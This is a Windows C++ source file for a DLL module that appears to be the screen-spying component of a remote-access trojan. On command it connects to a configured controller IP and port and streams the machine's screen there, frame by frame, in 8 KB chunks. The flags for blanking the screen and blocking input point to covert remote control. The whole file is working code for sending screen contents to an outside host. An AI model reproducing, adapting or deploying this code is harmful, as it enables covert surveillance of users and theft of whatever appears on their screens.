#ifndef TRIVAL 

// screen.cpp : Defines the entry point for the DLL application.
//
#include "screen.h"
#include "conn.h"
#include "macro.h"
#include "svrdll.h"
#include "ScreenSpy.h"

#include <time.h>
#include <windows.h>
#include <process.h>
#include <tlhelp32.h>

static BYTE	m_bAlgorithm = ALGORITHM_SCAN;
static HANDLE	m_hWorkThread;
static CCursorInfo	m_CursorInfo;
static CScreenSpy	*m_pScreenSpy = new CScreenSpy(8);
static bool	m_bIsCaptureLayer = false;
static int	m_biBitCount = 8;
static bool m_bIsWorking = false;
static bool m_bIsBlankScreen = false;
static bool m_bIsBlockInput = false;

static char ip[16];
static int conn_port;
static int conn_type;
static sock_funcs *gFuncs;

int OnScreenInitialize(void *p)
{
	union client_cfg* cfg= (union client_cfg*)p;
	
	strcpy(ip, cfg->cfg1.clientIP);
	conn_port = cfg->cfg1.port;
	conn_type = cfg->cfg1.conn_type;
	gFuncs = (sock_funcs *)(cfg->cfg1.reserved); 

	return 0;
}

static unsigned __stdcall screenThread(void* p)
{
	if(gFuncs == NULL)	return NULL;
	
	Sleep(200);
	
		int nStatus = 0, nWrite;
	conn ftpfd = gFuncs->mySocket(conn_type);
	if(ftpfd == NULL)	{	nStatus =  ERR_FAILCONN; goto leave;}

	struct sockaddr_in servaddr;
	servaddr.sin_port = gFuncs->myHtons(conn_port);
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = gFuncs->myInet_addr(ip);

	//连接监控机器
	if(gFuncs->myConnect(ftpfd, (const sockaddr*)&servaddr, sizeof(servaddr)) < 0)
	{	nStatus =  ERR_FAILCONN; goto leave;}
	
	//立马发送一个标记，提醒注意这是一个视频请求
	unsigned char task = 'S';
	control_header feedBack;
	gFuncs->myWrite(ftpfd, NULL, (char*)&task, sizeof(task));
	gFuncs->myRead(ftpfd, (char*)&feedBack, sizeof(feedBack), 0, NULL); 

	const int MAX_PACKAGE = 1024*8;
	
	//发送视频基本结构信息
	{
		control_header header = INITIALIZE_COMPRESS_HEADER(CONTROL_INFO_SCREEN);
		DWORD	dwLen = m_pScreenSpy->getBISize();
		char* bi = (char*)m_pScreenSpy->getBI();
	
		int offset = 0, one_len = MAX_PACKAGE;
		do
		{
			if(offset + one_len > dwLen)
				one_len = dwLen - offset;

			header.seq++;
			header.dataLen = one_len;

			nWrite = 0;
			nWrite = gFuncs->myWrite(ftpfd, &header, (char*)bi+offset, one_len);
			if(nWrite == WRITE_ERROR)	{nStatus =  gFuncs->myError;goto leave;}
			else if(nWrite == WRITE_TOOLONG)	{one_len /= 2; header.seq--; continue;}

			offset += one_len;

		}while(offset < dwLen);

		header.dataLen = -1;
		gFuncs->myWrite(ftpfd, &header, NULL, -1);
	}

	//发送第一帧
	{
		control_header header = INITIALIZE_COMPRESS_HEADER(CONTROL_FIRST_SCREEN);

		void* img = m_pScreenSpy->getFirstScreen();
		if (img == NULL)	{nStatus =  -100;goto leave;}
		DWORD	dwLen = m_pScreenSpy->getFirstImageSize();

		int offset = 0, one_len = MAX_PACKAGE;
		do
		{
			if(offset + one_len > dwLen)
				one_len = dwLen - offset;

			header.seq++;
			header.dataLen = one_len;

			nWrite = 0;
			nWrite = gFuncs->myWrite(ftpfd, &header, (char*)img+offset, one_len);
			if(nWrite == WRITE_ERROR)	{nStatus =  gFuncs->myError;goto leave;}
			else if(nWrite == WRITE_TOOLONG)	{one_len /= 2; header.seq--; continue;}

			offset += one_len;

		}while(offset < dwLen);

		header.dataLen = -1;
		gFuncs->myWrite(ftpfd, &header, NULL, -1);
		//printf("发送第一帧 %d\n", header.seq--);
	}

	int nRead = 0, frame = 1;
	while(1)
	{
		if(!m_bIsWorking) break;

		control_header header = INITIALIZE_COMPRESS_HEADER(CONTROL_NEXT_SCREEN);

		DWORD	dwLen;
		void* img = m_pScreenSpy->getNextScreen(&dwLen);
		if (dwLen == 0 || !img)	{nStatus =  -200;goto leave;}
		
		header.reserved = ++frame;
		int offset = 0, one_len = MAX_PACKAGE;
		do
		{
			if(offset + one_len > dwLen)
				one_len = dwLen - offset;

			header.seq++;
			header.dataLen = one_len;

			nWrite = 0;
			nWrite = gFuncs->myWrite(ftpfd, &header, (char*)img+offset, one_len);
			if(nWrite == WRITE_ERROR)	{nStatus =  conn_error;goto leave;}
			else if(nWrite == WRITE_TOOLONG)	{one_len /= 2; header.seq--; continue;}

			offset += one_len;

		}while(offset < dwLen);

		header.dataLen = -1;
		gFuncs->myWrite(ftpfd, &header, NULL, -1);
		//printf("发送第 %d 帧 %d\n", frame, header.seq--);

	}

leave:
	//REASSIGN_HEADER(header, CONTROL_CLOSE_MONITOR, nStatus);
	//conn_write(ftpfd, (const char*)&header, sizeof(header), 0);

	//printf("Leave %s %d\n", __FUNCTION__, nStatus);

	m_bIsWorking = false;
	gFuncs->myClose(ftpfd);
	return NULL;
}


int MonitorScreen(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_HEADER(CONTROL_MONITOR_SCREEN);
	int nStatus = 0;

	if(m_bIsWorking)
	{
		nStatus = ERR_EXIST;
		goto leave;
	}
	
	//开启线程
	unsigned threadID;
	m_bIsWorking = true;
	if((m_hWorkThread = (HANDLE)_beginthreadex(NULL, 0, screenThread, NULL, 0, &threadID) ) == NULL)
		nStatus = ERR_FAILJOB;
leave:
	header.response = nStatus;
	if(fn)	fn(s, &header, NULL, 0);
	return nStatus;
	
	return 0;
}

int CloseScreen(conn s, char* buf, int n, writeToClient fn)
{
	control_header header = INITIALIZE_HEADER(CONTROL_CLOSE_SCREEN);
	int nStatus = 0;
	
	//printf("%s %d\n", __FUNCTION__, m_bIsWorking);

	if(m_bIsWorking == false)	goto leave;

	m_bIsWorking = false;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CloseHandle(m_hWorkThread);

leave:
	header.response = nStatus;
	if(fn)	fn(s, &header, NULL, 0);
	return nStatus;
	return 0;
}
#endif